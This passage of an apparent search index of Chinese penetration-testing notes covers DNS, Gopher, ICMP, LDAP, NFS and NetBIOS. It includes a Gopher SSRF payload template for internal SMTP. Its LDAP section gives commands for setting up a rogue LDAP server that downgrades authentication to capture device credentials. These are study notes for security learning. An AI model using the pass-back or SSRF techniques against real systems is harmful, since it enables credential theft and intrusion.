\u670d\u52a1\u5668\u53d1\u9001\u67e5\u8be2\u8bf7\u6c42\u3002</li> <li><code>zonetransfer.me</code>\uff1a\u8fd9\u662f\u8981\u67e5\u8be2\u7684\u57df\u540d\uff0c\u4e5f\u5c31\u662f\u8bf7\u6c42\u7684 DNS \u533a\u57df\u3002<code>zonetransfer.me</code> \u662f\u4e00\u4e2a\u7528\u4e8e\u6f14\u793a\u533a\u57df\u4f20\u8f93\u98ce\u9669\u7684\u57df\u540d\u3002</li> </ul> </li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#nslookup","title":"nslookup\u547d\u4ee4","text":"<ul> <li>Professional Toolset\u00a0(https://tools.dnsstuff.com)</li> <li>DNS Records\u00a0(https://network-tools.com)</li> </ul> <p>DNS\u5386\u53f2\u89e3\u6790\uff1a https://www.kancloud.cn/noahs/src_hacker/2120650</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#dnsip2domain","title":"DNS\u57df\u540d\u53cd\u67e5\uff08IP2Domain\uff09","text":"<p>tool-links#have IP/Domain</p> <p>\u76ee\u6807\u662f\u865a\u62df\u4e3b\u673a\u65f6\u5f88\u6709\u7528\uff0c\u865a\u62df\u4e3b\u673a\u6709\u4e0d\u540c\u57df\u540d\uff0c\u4f46\u5f80\u5f80\u5171\u7528\u4e00\u4e2aIP\u3002 \u627e\u5230\u54ea\u4e9b\u7f51\u7ad9\u5171\u7528\u8fd9\u53f0\u670d\u52a1\u5668\uff0c\u5c31\u53ef\u901a\u8fc7\u8be5\u670d\u52a1\u5668\u4e0a\u7684\u5176\u4ed6\u7f51\u7ad9\u7684\u6f0f\u6d1e\u8fdb\u884c\u6e17\u900f\u2014\u2014\u65c1\u6ce8\u3002</p> <ul> <li>www.ip-adress.com/reverse_ip/</li> <li>\u3010\u5de5\u5177\u7f51\u3011 https://www.yougetsignal.com \uff08Reverse IP Domain Check\uff09</li> <li>DNSRecon\u547d\u4ee4\uff1a<code>dnsrecon -r 162.241.216.0-162.241.216.255</code><ul> <li>-r: range</li> </ul> </li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#dns_2","title":"DNS\u670d\u52a1\u5668\u914d\u7f6e","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#bind","title":"BIND","text":"<p>Berkeley Internet Name Domain</p> <p>\u5982\u4f55\u5728\u5c40\u57df\u7f51\u4e2d\u642d\u5efaLINUX\u670d\u52a1\u5668\u7248\u672c\u7684DNS\u670d\u52a1</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/Gopher/","title":"Gopher","text":"<p>https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2</p> <p>\u201cSMTP \u8ba8\u538c HTTP\u201d\uff0c\u56e0\u4e3a\u7531\u4e8e SMTP \u670d\u52a1\u5668\u672c\u8eab\u7684\u9650\u5236\uff0cHTTP \u65e0\u6cd5\u8d70\u79c1(smuggle\uff0c\u643a\u5e26)\u5230 SMTP \u4e2d\u2014\u2014\u5c06 HTTP \u8d70\u79c1\u5230 SMTP \u662f\u7edd\u5bf9\u4e0d\u53ef\u80fd\u7684\uff0c\u56e0\u4e3a\u80af\u5b9a\u4f1a\u88ab\u62d2\u7edd\uff0c\u4f46\u662f\u53ef\u4ee5\u5229\u7528 Gopher \u548c HTTPS \u534f\u8bae\u8d70\u79c1\u5230 SMTP \u534f\u8bae\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u4e86\u3002</p> <p>[!NOTE] HTTPS \u4e0d\u652f\u6301\u50cf gopher \u90a3\u6837\u7684\u591a\u884c\u8bf7\u6c42\uff0c\u56e0\u6b64\u5982\u679c\u60a8\u60f3\u901a\u8fc7 HTTPS \u67e5\u8be2 SMTP\uff0c\u5219\u9700\u8981 CRLF \u6ce8\u5165\u6f0f\u6d1e\u3002</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/Gopher/#smtp-gopher","title":"SMTP \u67e5\u8be2\u7684 Gopher \u8bed\u6cd5","text":"<p><code>gopher://&lt;Intranet_IP&gt;:25/_&lt;Command_SMTP&gt;</code></p> <p>[!NOTE] <code>&lt;Command_SMTP&gt;</code>\u524d\u9762\u7684 <code>_</code>\uff08\u4e0b\u5212\u7ebf\uff09\u8868\u793agophertype \u56e0\u6b64\u5fc5\u987b\u5305\u542b\u5b83\uff0c\u56e0\u4e3a\u5982\u679c\u4e0d\u5305\u542b\u8be5\u5b57\u7b26\uff0c\u5219\u8d1f\u8f7d\u5c06\u88ab\u622a\u65ad1\u4e2a\u5b57\u7b26\u3002\u4f8b\u5982\u8d1f\u8f7d\u4e3aHelloWorld\uff0c\u5982\u679c<code>_</code>\u7b26\u53f7\u4e3a\u4e0d\u5305\u542b\u7684\u6709\u6548\u8d1f\u8f7d\u5c06\u53d8\u6210 ElloWorld..</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/ICMP/","title":"ICMP","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/ICMP/#typecode","title":"type&amp;code","text":"<ul> <li>\u5404Type\u7684code0\u5373\u8be5Type\u7684\u4e3b\u8981\u7c7b\u578b\uff0c\u82e5\u6709\u8be6\u7ec6\u5206\u7c7b\uff0c\u5219\u4ece1\u5f00\u59cb\u7f16\u53f7\u2014\u2014\u5373\u7406\u89e3\u4e3a\uff1a0\u662f\u6839\u76ee\u5f55</li> <li>type0 code0\uff1aecho\u54cd\u5e94</li> <li> <p>type8 code0\uff1aecho\u8bf7\u6c42</p> </li> <li> <p>type3 code0\uff1a\u76ee\u6807\u7f51\u7edc\u4e0d\u53ef\u8fbe</p> <ul> <li>code1\uff1a\u76ee\u6807\u4e3b\u673a\u4e0d\u53ef\u8fbe</li> <li>code2\uff1a\u534f\u8bae\u4e0d\u53ef\u8fbe</li> <li>code3\uff1aport\u4e0d\u53ef\u8fbe\uff08\u5373\u5173\u95ed\uff09\u3010UDP\u626b\u63cf\u8fd4\u56de\u8fd9\u4e2a\u5219\u8bf4\u660e\u7aef\u53e3\u5173\u95ed\u3011</li> <li>code9\uff1a</li> <li>code10\uff1a</li> <li>code13\uff1a\u8868\u793a\u65e0\u6cd5\u8def\u7531\u6570\u636e\u5305\uff0c\u56e0\u4e3a\u5b83\u5728\u7ba1\u7406\u4e0a\u88ab\u7981\u6b62\uff08\u9632\u706b\u5899\u6216\u8def\u7531\u5668 ACL\uff09\u3002\u63a2\u6d4bFW\u7528\uff08\u4e0d\u8fc7\u4f3c\u4e4e\u9700\u8981FW\u914d\u7f6e\u597d\u4e86\u624d\u4f1a\u663e\u793a\uff09</li> </ul> </li> <li> <p>type4 code0\uff1a\u7f51\u7edc\u62e5\u5835\uff08\u9650\u5236\u53d1\u9001\uff09</p> </li> <li>type11 code0\uff1aTTL\u8d85\u8fc7</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/ICMP/#nmaptype","title":"nmap\u4e2d\u5229\u7528\u7684type","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/ICMP/#port0","title":"port0","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/ICMP/#cpts","title":"\u6e17\u900f/CPTS","text":"<p>Port 0 is a reserved port in TCP/IP networking and is not used in TCP or UDP messages. If anything attempts to bind to port 0 (such as a service), it will bind to the next available port above port 1,024 because port 0 is treated as a \"wild card\" port.</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/","title":"LDAP","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#_1","title":"\u6982\u5ff5","text":"<p>Lightweight Directory Access Protocol\uff0c\u8f7b\u91cf\u7ea7\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\u3002</p> <p>LDAP\u5177\u6709\u7b80\u5355\u7684\u6811\u7ed3\u6784\uff0c\u4e0d\u80fd\u50cf\u6570\u636e\u5e93\u90a3\u6837\u5177\u6709\u590d\u6742\u7684\u7ed3\u6784\u3002\u7531\u4e8e\u8d1f\u8f7d\u8f83\u8f7b\uff0c\u9002\u5408\u7ba1\u7406\u7cfb\u7edf\u8d26\u6237\u3002</p> <ul> <li>LDAP \u8eab\u4efd\u9a8c\u8bc1\u662f\u4e0e AD \u96c6\u6210\u7684\u7b2c\u4e09\u65b9\uff08\u975e Microsoft\uff09\u5e94\u7528\u7a0b\u5e8f\u7684\u4e00\u79cd\u6d41\u884c\u673a\u5236\u3002</li> <li> <p>\u7528\u6765\u8bbf\u95ee/\u64cd\u4f5cAD\u5185\u7684\u5bf9\u8c61\u7684\u534f\u8bae\u3002AD\u7528LDAP\u547d\u540d\u8def\u5f84\u6765\u8868\u793a\u5bf9\u8c61\u5728AD\u5185\u7684\u4f4d\u7f6e\u7d22\u5f15\u3002</p> </li> <li> <p>BindRequest (\u8ba4\u8bc1)</p> <ul> <li>Bind\u5c31\u662fLDAP\u767b\u9646\u7684\u610f\u601d\u2014\u2014BindDN</li> </ul> </li> <li>SearchRequest (LDAP\u641c\u7d22)</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#_2","title":"\u8ba4\u8bc1\u6d41\u7a0b","text":"<p>\u5c31\u662f\u628a\u7528\u6237\u6570\u636e\u653e\u5728LDAP\u670d\u52a1\u5668\u4e0a\uff0c\u901a\u8fc7LDAP\u670d\u52a1\u5668\u4e0a\u7684\u6570\u636e\u5bf9\u7528\u6237\u8fdb\u884c\u8ba4\u8bc1\u5904\u7406\u3002</p> <p>\u5b9e\u73b0\u539f\u7406\u4e4b\u4e00\uff1a\u5bf9\u6bcf\u4e00\u4e2a\u767b\u9646\u8bf7\u6c42\uff0c\u4f1a\u53d1\u9001\u672c\u5730\u7684\u7528\u6237\u3001\u5bc6\u7801\u7ed9LDAP\u670d\u52a1\u5668\uff0c\u7136\u540e\u5728LDAP\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u5339\u914d\uff0c\u7136\u540e\u5224\u65ad\u662f\u5426\u53ef\u4ee5\u901a\u8fc7\u8ba4\u8bc1\u3002</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#ldap","title":"LDAP\u547d\u540d\u8def\u5f84","text":"<p>LDAP\u6811\uff1a </p> <ul> <li>sn\uff1asurname\uff08\u59d3\u6c0f\uff09</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#dndistinguished-nameldap","title":"DN\uff08distinguished Name\uff09\uff1a\u6807\u8bc6\u540d\u79f0\uff0cLDAP\u5b8c\u6574\u8def\u5f84\u3002","text":"<p>DN \u6709\u4e09\u4e2a\u5c5e\u6027\uff0c\u5206\u522b\u662f\uff1a</p> <ul> <li>DC (Domain Component)\uff1a\u57df\u540d\u7ec4\u4ef6\u3002DNS\u57df\u540d\u7684\u6bcf\u4e2a\u5143\u7d20\u3002\u5982\u201cDC=.com\u201d\u201cDC=.panasonic\u201d</li> <li> <p>OU (Organizational Unit)\uff1a\u7ec4\u7ec7\u5355\u4f4d\uff0c\u6700\u591a4\u7ea7\u3002\u5b9a\u4e49\u7ec4\u7684\u7b56\u7565\u3002\u662f\u4e00\u79cd\u5bb9\u5668\uff0c\u7406\u89e3\u4e3a\u6587\u4ef6\u5939\uff0c\u53ef\u4ee5\u5206\u7ec4\u3001\u7ba1\u7406\u5176\u4ed6\u5bf9\u8c61\u3002</p> </li> <li> <p>\u7528\u4e8e\u7ec4\u7ec7\u548c\u5206\u7ec4\u6761\u76ee\uff0c\u4ee5\u4fbf\u66f4\u597d\u5730\u7ba1\u7406\u76ee\u5f55\u3002</p> </li> <li>\u901a\u5e38\u7528\u4e8e\u521b\u5efa\u5c42\u6b21\u7ed3\u6784\uff0c\u5982 OU=Users\u3001OU=Groups\u3002</li> <li> <p>\u901a\u5e38\u4e0d\u76f4\u63a5\u7528\u4e8e\u6807\u8bc6\u5177\u4f53\u7684\u5b9e\u4f53\uff0c\u800c\u662f\u7528\u4e8e\u5bb9\u7eb3 CN\u3002</p> </li> <li> <p>CN (Common Name)\uff1a\u901a\u7528\u540d\u79f0\uff0c\u5373\u5bf9\u8c61\u7684\u540d\u79f0\u3002\u4e00\u822c\u4e3a\u7528\u6237\u540d\uff08\u53ef\u4ee5\u4e2d\u6587\uff09\u6216\u8ba1\u7b97\u673a\u540d</p> </li> <li> <p>\u901a\u5e38\u7528\u4e8e\u6807\u8bc6\u5177\u4f53\u7684\u5b9e\u4f53\uff0c\u5982\u7528\u6237\u3001\u8ba1\u7b97\u673a\u3001\u670d\u52a1\u7b49\u3002</p> </li> <li>\u5728\u7279\u5b9a OU \u5185\uff0cCN \u5e94\u8be5\u662f\u552f\u4e00\u7684\u3002</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#bind-dn","title":"Bind DN","text":"<p>LDAP\u7684\u767b\u9646\u7528\u6237\u3002</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#base-dn","title":"Base DN","text":"<p>LDAP\u30b5\u30fc\u30d3\u30b9\u3078\u30ed\u30b0\u30a4\u30f3\u3057\u305f\u5f8c\u3001\u3069\u306e OU \u914d\u4e0b\u306e\u60c5\u5831\u3092\u6271\u3046\u304b\u3092\u793a\u3059\u3082\u306e\u3067\u3059\u3002<code>suffix</code>\u3068\u3082\u547c\u3070\u308c\u307e\u3059\u3002</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#rdn","title":"RDN","text":"<p>\u662fDN\u4e2d\u6bcf\u4e00\u4e2a\u7528\u9017\u53f7\u5206\u9694\u7684\u8868\u8fbe\u5f0f\u3002</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#_3","title":"\u641c\u7d22\u5de5\u5177","text":"<ul> <li>ldapsearch</li> <li>powershell#Get-ADUser</li> <li>dsquery</li> <li>LDP.exe\uff1a\u666e\u901a\u57df\u4e3b\u673a\u9ed8\u8ba4\u6ca1\u6709\uff0c\u9700\u8981\u5b89\u88c5\uff0c\u4e0d\u8fc7\u8fd9\u662f\u5fae\u8f6f\u7684\u5de5\u5177\u3002\u5728cmd\u4e2d\u8f93\u5165 <code>ldp</code> \u542f\u52a8\uff0c\u548c <code>AD Explorer</code> \u7c7b\u4f3c</li> <li>DirectorySearcher \u5bf9\u8c61\uff08 #OSCP \uff09\uff1a<code>[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</code></li> <li>pyldapsearch</li> <li>ldeep</li> </ul> <p>https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#bloodhound","title":"\u7528BloodHound\u5206\u6790\u7ed3\u679c","text":"<ol> <li>BloodHound compatible \u306a\u5f62\u5f0f\u306b\u30c7\u30fc\u30bf\u3092\u5909\u63db(BOFHound)</li> <li>BloodHound\u306bimport</li> <li>BloodHound\u3067\u5206\u6790\uff1abloodhound-gui</li> </ol>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#rootdse","title":"RootDSE","text":"<p>The top of the directory information tree (DIT) on each DSA is the root of the tree.</p> <p>\u5728\u6bcf\u4e2aDSA\u7684DIT\u7684\u9876\u7aef\uff0c\u90fd\u4f1a\u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u6761\u76ee\u79f0\u4e3aRoot DSE\u3002\u8fd9\u4e2a\u6761\u76ee\u5305\u542b\u4e0eDSA\u6709\u5173\u7684\u7279\u5b9a\u4fe1\u606f\uff0c\u5982\u652f\u6301\u7684LDAP\u7248\u672c\u3001\u6269\u5c55\u64cd\u4f5c\u3001\u57df\u540d\u4fe1\u606f\uff08<code>namingContexts</code>\u5c5e\u6027\uff09\u7b49\u3002</p> <ul> <li>DSE: DSA-specific entry</li> <li>DSA\uff1aDirectory System Agent\uff0c\u5b83\u662fLDAP\u76ee\u5f55\u670d\u52a1\u7684\u4e00\u4e2a\u6838\u5fc3\u7ec4\u4ef6\uff0c\u8d1f\u8d23\u5904\u7406LDAP\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\uff0c\u5e76\u7ba1\u7406\u76ee\u5f55\u4fe1\u606f\u6811\uff08DIT\uff09\u4e2d\u7684\u6570\u636e\u3002</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#search-with-nmap","title":"Search with nmap","text":"<p>we should check the\u00a0nmap\u00a0output for the\u00a0RootDSE\u00a0and any potential hostname.</p> <pre><code>sudo nmap -Pn --script ldap-rootdse.nse $target_ip\n</code></pre>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#search-with-ldapsearch","title":"Search with ldapsearch","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#global-catalog","title":"\u5168\u5c40\u76ee\u5f55\uff08Global Catalog\uff09","text":"<p>\u5168\u5c40\u76ee\u5f55\u66f4\u65b0\u5e76\u540c\u6b65\u6240\u6709 DC \u4e0a\u7684\u76ee\u5f55\u526f\u672c\u3002</p> <p>Large networks may have multiple DCs managed by\u00a0a Global Catalog\u00a0that updates and synchronizes\u00a0directory copies across all DCs.</p> <p></p> <p>\u7528\u9014\uff1a\u5f88\u591a\u65f6\u5019\uff0c\u7528\u6237\u6216\u5e94\u7528\u7a0b\u5e8f\u4e0d\u77e5\u9053\u76ee\u6807\u5bf9\u8c61\u7684 DN \u6216\u54ea\u4e2a\u5206\u533a\u53ef\u80fd\u5305\u542b\u8be5\u5bf9\u8c61\u3002\u5168\u5c40\u7f16\u5f55 (GC) \u5141\u8bb8\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\u5728\u7ed9\u5b9a\u76ee\u6807\u5bf9\u8c61\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u5c5e\u6027\u7684\u60c5\u51b5\u4e0b\u5728 Active Directory \u57df\u6811\u4e2d\u67e5\u627e\u5bf9\u8c61\u3002</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#win","title":"\u5b89\u88c5\uff08Win\uff09","text":"<ul> <li>AD DS\u7684\u5f00\u5173\u547d\u4ee4\uff1a<code>dcpromo</code>\u3002\u8f6c\u6362\u8be5\u670d\u52a1\u5668\u7684\u89d2\u8272\uff08\u57df\u63a7or\u6210\u5458\uff09</li> <li>DC\u4f1a\u5c06\u81ea\u5df1\u626e\u6f14\u7684\u89d2\u8272\u6ce8\u518c\u5230DNS\uff0c\u4ee5\u4fbf\u8ba9\u5176\u4ed6PC\u80fd\u591f\u901a\u8fc7DNS\u627e\u5230\u8fd9\u53f0DC</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#_4","title":"\u653b\u51fb\u624b\u6cd5","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#ldap-pass-back-attacks","title":"LDAP Pass-back Attacks","text":"<p>\u5728\u5982\u6253\u5370\u673a\u7b49\u8bbe\u5907\u7684\u914d\u7f6e\u754c\u9762\uff0c\u901a\u5e38\u9884\u7559\u4e86\u51ed\u636e\u2014\u2014\u4f46\u662f\u5bc6\u7801\u4e0d\u53ef\u89c1\u65f6\uff0c\u5c06\u8ba4\u8bc1\u4f20\u5230\u6211\u4eec\u81ea\u5df1\u7684LDAP\u670d\u52a1\u5668\u3002</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#hosting-a-rogue-ldap-server-ldap","title":"Hosting a Rogue LDAP Server \u6258\u7ba1\u6076\u610f LDAP \u670d\u52a1\u5668","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#openldap","title":"\u5b89\u88c5OpenLDAP","text":"<p><code>sudo apt-get update &amp;&amp; sudo apt-get -y install slapd ldap-utils &amp;&amp; sudo systemctl enable slapd</code></p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#_5","title":"\u5b89\u88c5\u5b8c\u540e\u91cd\u65b0\u914d\u7f6e","text":"<p><code>sudo dpkg-reconfigure -p low slapd</code></p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#plain-login","title":"\u964d\u7ea7\u9a8c\u8bc1\u673a\u5236\uff1aPLAIN \u548c LOGIN","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#_6","title":"\u521b\u5efa\u914d\u7f6e\u6587\u4ef6","text":"<pre><code># cat olcSaslSecProps.ldif\ndn: cn=config\nreplace: olcSaslSecProps\nolcSaslSecProps: noanonymous,minssf=0,passcred\n</code></pre>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#_7","title":"\u5e94\u7528\u914d\u7f6e","text":"<p><code>sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif &amp;&amp; sudo service slapd restart</code></p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#_8","title":"\u9a8c\u8bc1\u914d\u7f6e","text":"<pre><code>\u2514\u2500$ ldapsearch -LLL -x -H ldap:// -s base -b \"\" supportedSASLMechanisms\ndn:\nsupportedSASLMechanisms: LOGIN\nsupportedSASLMechanisms: PLAIN\n</code></pre>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/LDAP/#ldap_1","title":"\u6355\u83b7LDAP\u9a8c\u8bc1","text":"<p><code>$ sudo tcpdump -SX -i breachad tcp port 389</code></p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/NFS/","title":"NFS","text":"<p>2049/TCP</p> <ul> <li>NFS\uff1a\u7f51\u7edc\u6587\u4ef6\u7cfb\u7edf</li> <li>NFS\u901a\u5e38\u4e0eUnix\u7cfb\u7edf\u4e00\u8d77\u7528</li> </ul>","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/NFS/#_1","title":"\u5de5\u5177","text":"","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/NFS/#rdpscan","title":"RDPScan","text":"<p>\uff08\u7b80\u5355\u626b\u63cf\uff0ccheck\u5171\u4eab\u914d\u7f6e\u9519\u8bef\uff09</p> <p>\u5173\u4e8e\u4e3a\u4ec0\u4e48\u662fRDP\u626b\u63cf\uff1a  </p> <p>Portmapper \u548c RPCbind \u90fd\u5728 TCP \u7aef\u53e3 111 \u4e0a\u8fd0\u884c\u3002 RPCbind \u5c06 RPC \u670d\u52a1\u6620\u5c04\u5230\u5b83\u4eec\u6240\u76d1\u542c\u7684\u7aef\u53e3\u3002 RPC \u8fdb\u7a0b\u5728\u542f\u52a8\u65f6\u901a\u77e5 rpcbind\uff0c\u6ce8\u518c\u5b83\u4eec\u6b63\u5728\u4fa6\u542c\u7684\u7aef\u53e3\u548c\u5b83\u4eec\u671f\u671b\u670d\u52a1\u7684 RPC \u7a0b\u5e8f\u7f16\u53f7\u3002 \u7136\u540e\uff0c\u5ba2\u6237\u7aef\u7cfb\u7edf\u4f7f\u7528\u7279\u5b9a\u7684 RPC \u7a0b\u5e8f\u7f16\u53f7\u8054\u7cfb\u670d\u52a1\u5668\u4e0a\u7684 rpcbind\u3002 rpcbind \u670d\u52a1\u5c06\u5ba2\u6237\u7aef\u91cd\u5b9a\u5411\u5230\u6b63\u786e\u7684\u7aef\u53e3\u53f7\uff08\u901a\u5e38\u662f TCP \u7aef\u53e3 2049\uff09\uff0c\u4ee5\u4fbf\u5b83\u53ef\u4ee5\u4e0e\u8bf7\u6c42\u7684\u670d\u52a1\u8fdb\u884c\u901a\u4fe1\u3002</p>","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/NFS/#nmap","title":"nmap","text":"","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/NFS/#filesnarf","title":"Filesnarf","text":"<p>\u662f\u4e13\u95e8\u4e3a NFS \u800c\u8bbe\u8ba1\u7684\uff0c\u5b83\u5c06\u4ece NFS \u6d41\u91cf\u4e2d\u55c5\u63a2\u5230\u7684\u6587\u4ef6\u4fdd\u5b58\u5230\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e2d\u3002</p>","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/NetBIOS/","title":"NetBIOS","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/NetBIOS/#137udp","title":"137/UDP","text":"<ul> <li>NetBIOS Name Service</li> <li>NBNS\uff1aNetBIOS\u540d\u79f0\u670d\u52a1</li> <li>\u6216NBT-NS\uff1aNetBIOS over TCP</li> </ul> <p>NetBIOS\u5c31\u662f\u7528NBNS\u89e3\u6790\u540d\u79f0\uff08\u6293\u5305\u770b\u4f3c\u4e4eNBNS\u4e5f\u6709\u7528mDNS\uff08\u7ec4\u64adDNS\uff09\uff09</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/NetBIOS/#138udp","title":"138/UDP","text":"<ul> <li>NBND</li> <li>NetBIOS Datagram</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/NetBIOS/#139tcp","title":"139/TCP","text":"<ul> <li>NBSS</li> <li> <p>NetBIOS Session Service</p> </li> <li> <p>\u548cSMB\u4e0d\u540c\u3002\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u4f1a\u8bdd\u5c42\u534f\u8bae/\u670d\u52a1</p> </li> <li>\u800cNBT\uff08NetBIOSoverTPC\uff09\uff0c139/TCP\u662f\u5411\u540e\u517c\u5bb9\u7684\u3002\u6240\u4ee5\u4e00\u822c\u624d139\u548c445\u90fd\u626b\u3002</li> </ul> <p>Port 139: This port is used for NetBIOS. NetBIOS is an acronym for Network Basic Input/Output System. It provides services related to the session layer of the OSI model allowing applications on separate computers to communicate over a local area network. As strictly an API, NetBIOS is not a networking protocol. Older operating systems ran 